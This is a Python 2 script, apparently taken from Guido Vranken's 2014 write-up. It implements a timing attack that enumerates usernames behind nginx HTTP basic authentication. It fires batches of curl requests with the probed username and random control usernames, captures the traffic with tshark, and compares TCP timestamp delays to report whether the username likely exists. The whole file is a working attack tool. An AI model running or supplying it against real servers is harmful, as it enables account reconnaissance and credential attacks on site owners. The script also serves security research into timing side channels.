#!/usr/bin/env python
# script from https://guidovranken.com/2014/08/01/a-timing-attack-on-nginx-http-auth-basic-module/

import string, random, argparse
import socket, fcntl, struct
from time import sleep
from subprocess import call, Popen, PIPE, STDOUT
from urlparse import urlparse
from os import devnull, remove

class TCPAnalyze:
    def __init__(self, src_ip, dest_ip, dest_port, method):
            self.IP = src_ip
            self.dest_IP = dest_ip
            self.port = int(dest_port)
            if method == "remote":
                self.time_source = "tcp.options.timestamp.tsval"
            elif method == "local":
                self.time_source = "frame.time_epoch"
            else:
                raise Exception("Invalid time source (specify either 'local' or 'remote'")
    def is_port(self, port):
            return port == self.port 
    def is_local(self):
            return not self.is_port( self.tcp_srcport )
    def is_remote(self):
            return self.is_port( self.tcp_srcport )
    def analyze(self, filename):
        command = [    "tshark",
                "-r", filename,
                "-T", "fields",
                "-e", self.time_source,
                "-e", "tcp.srcport",
                "-e", "tcp.flags.syn",
                "-e", "tcp.flags.ack",
                "-e", "tcp.flags.push",
                "-R", "ip.src eq " + self.IP + " or ip.dst eq " + self.IP]

        proc = Popen(command, stdout=PIPE)

        # Read the list of timestamps
        tmp = proc.stdout.read()

        # Split the contiguous data into a list of lines
        lines = tmp.split("\n")

        state = None
        diffs = []
        for l in lines:
            if l.strip() == "":
                break

            l = l.strip().split("\t")

            tsval = float(l[0].strip())
            tcp_srcport = float(l[1].strip())
            self.tcp_srcport = tcp_srcport
            syn = True if l[2] == "1" else False
            ack = True if l[3] == "1" else False
            psh = True if l[4] == "1" else False

            if self.is_local() and syn:
                state = "syn"
            elif state == "syn" and self.is_remote() and syn and ack:
                state = "synack"
            elif state == "synack" and self.is_local() and not syn and ack:
                state = "connected"
            elif state == "connected" and self.is_local() and psh:
                state = "sent"
            elif state == "sent" and self.is_remote() and not psh and ack:
                state = "accepted"
                tsv = tsval
            elif state == "accepted" and self.is_remote() and psh and ack:
                diffs.append( tsval - tsv )
                state = "done"
        return sum( diffs ) / float(len( diffs ))

class NGXUsernameEnumeration:
    def __init__(self, REPEAT=50, DUMMY_USERS=2, method="local"):
        # Denotes amount of HTTP requests per username
        self.REPEAT = REPEAT

        # Denotes amount of randomized usernames in addition to supplied username
        self.DUMMY_USERS = DUMMY_USERS

        self.method = method

        try:
            self.print_message()
            self.init_parser()
            self.prepare_usernames()
            self.log_and_parse()
            self.cleanup()
        except Exception as ex:
            print "Error: %s" % (ex)

            self.cleanup()
            exit(1)

        exit(0)
    def print_message(self):
        print  """
               nginx HTTP basic auth username enumeration

               by Guido Vranken
               http://www.guidovranken.nl

               I waive all liability. For educational purposes only.

           """

    def init_parser(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("url", help = "Full URL of auth-protected page")
        parser.add_argument("ip", help = "Server IP (remember that a domain may have multiple IP's)")
        parser.add_argument("interface", help = "Network interface (for example eth0)")
        parser.add_argument("outfile", help = "Output file (for example /root/out.pcap)")
        parser.add_argument("username", help = "Username whose existence you wish to probe")
        args = parser.parse_args()

        # Check HTTP URL validity
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            raise Exception("URL must start with http:// or https://")

        self.port = urlparse(args.url).port

        # Fill in default port if necessary
        if self.port == None:
            self.port = 80 if args.url.startswith("http://") else 443

        self.URL = args.url
        self.IP = args.ip
        self.interface = args.interface
        self.outfile = args.outfile
        self.username = args.username
        
        local_ip = self.get_ip_address( self.interface )
        self.tcpa = TCPAnalyze(local_ip, self.IP, self.port, self.method)

    def prepare_usernames(self):
        N = len(self.username)

        while True:
            usernames = []
            # Generate two randomized usernames of the same length
            # Amount may be increased for additional reliability at the expense of bandwidth usage
            for i in range( self.DUMMY_USERS ):
                usernames.append(''.join(random.choice(string.ascii_letters + string.digits) for _ in range(N)))

            # Add the supplied username
            usernames.append( self.username )

            # Just to be sure, assure that there are no duplicates
            if len(set(usernames)) == len(usernames):
                break

            # Otherwise traverse the code above once again

        self.usernames = usernames

    def log_and_parse(self):
        diffs = []

        for user in self.usernames:
            outfile = self.outfile_user( user )
            self.start_logging( outfile )
            self.run_curl_batch( user )
            self.stop_logging( )
            diffs.append( self.tcpa.analyze( outfile ) )

        self.calculate_difference( diffs )

    def start_logging(self, outfile):
        # Run tshark in logging mode the background
        ret = Popen([    "tshark",
                "-i", self.interface,
                "-w", outfile])

        # Sleep for a bit to ensure tshark has initialized properly and is ready to log
        sleep(3)

    def run_curl_batch(self, username):
        for y in range(self.REPEAT):
            # Construct username:password pair
            user_pass = username + ":xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
            command = [    "curl",
                    "-u", user_pass,
                    # Discard webserver output
                    "-o", "/dev/null",
                    # Quiet
                    "-s",
                    # The URL of the page
                    self.URL]

            # Invoke curl
            call(command)

    def stop_logging(self):
        sleep(3)
        
        # Route output of pidof to /dev/null
        FNULL = open(devnull, 'w')
        # Halt tshark logging
        call(["killall", "tshark"], stdout=FNULL, stderr=STDOUT)
        FNULL.close()

    def calculate_difference(self, diffs):
        # Calculate average, not including user-supplied username
        avg = sum( diffs[:-1] ) / float(len( diffs[:-1] ))

        # avg == 0.0 means that no timing differences at all have been found in the control set
        if avg == 0.0:
            raise Exception(
                    "Please increase the REPEAT variable in the script and run it again" )
        else:
            # Calculate the percentage in relation to the average of the control set
            percentage = diffs[-1] / avg * 100.0

        # Print results
        print
        print "Time required to process '%s' is %f percent of the average time." % \
                                        (self.usernames[-1], percentage)
        print "(Above a couple of hunderd percent or so is meaningful)"
        print

    def cleanup(self):
        self.stop_logging()

        # Delete pcap files
        if hasattr(self, 'outfile') and hasattr(self, 'usernames'):
            for user in self.usernames:
                remove( self.outfile_user( user ) )

    def outfile_user( self, username ):
        return self.outfile + "_" + username

    def get_ip_address(self, ifname):
        """ From
        http://code.activestate.com/recipes/439094-get-the-ip-address-associated-with-a-network-inter/
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', ifname[:15])
        )[20:24])

# Go
NGXUsernameEnumeration()
